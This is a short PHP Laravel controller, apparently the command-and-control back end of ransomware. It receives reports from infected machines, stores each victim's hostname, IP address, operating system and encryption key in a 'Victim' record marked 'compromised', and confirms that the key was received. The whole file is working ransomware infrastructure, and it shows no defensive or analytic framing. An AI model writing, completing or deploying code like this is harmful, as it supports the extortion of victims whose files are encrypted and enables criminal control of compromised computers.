<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Victim;
use Illuminate\Http\Request;

class C2ReportController extends Controller
{
    public function store(Request $request)
    {
        $hostname = $request->input('hostname');
        $ipAddress = $request->ip();
        $encryptionKey = $request->input('encryption_key');
        $targetOs = $request->input('target_os');

        $victim = Victim::updateOrCreate(
            ['hostname' => $hostname],
            [
                'ip_address' => $ipAddress,
                'os' => $targetOs,
                'encryption_key' => $encryptionKey,
                'status' => 'compromised',
            ]
        );

        return response()->json([
            'status' => 'success',
            'message' => 'Key received successfully.',
            'victim_id' => $victim->id
        ], 200);
    }
}